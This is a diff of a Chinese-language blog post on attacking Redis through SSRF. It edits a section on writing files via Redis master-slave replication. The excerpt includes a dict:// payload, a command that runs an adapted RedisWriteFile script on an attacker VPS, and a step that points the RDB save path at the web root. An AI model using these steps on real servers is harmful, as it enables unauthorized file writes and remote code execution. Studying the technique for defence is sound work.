@@ -180,11 +180,11 @@
 </ol>
 <p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p>
 <h2 id="主从同步文件"><a href="#主从同步文件" class="headerlink" title="主从同步文件"></a>主从同步文件</h2><p>r35tart师傅将Redis主从同步RCE的脚本 <a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 改了一下实现了无杂质写文件，这是一个主动连目标Redis打的脚本。</p>
-<p>我把一些主动打的功能去掉，装修成了适用SSRF的守株待兔式脚本Orz。。。</p>
+<p>脚本耦合度不高只要把一些主动打的功能删掉就可以了，然后利用SSRF手动发包即可。</p>
 <ol start="0">
 <li>准备要无损写的文件，在VPS上执行脚本</li>
 </ol>
-<p><code>python3 ssrf-redis-writefile.py --lhost=124.70.77.141 --lport=6379 --lfile=test.txt</code></p>
+<p><code>python3 ssrf-redis-writefile.py --lhost=1.1.1.1 --lport=6379 --lfile=test.txt</code></p>
 <ol>
 <li>设置RDB文件的保存路径为Web根目录</li>
 </ol>
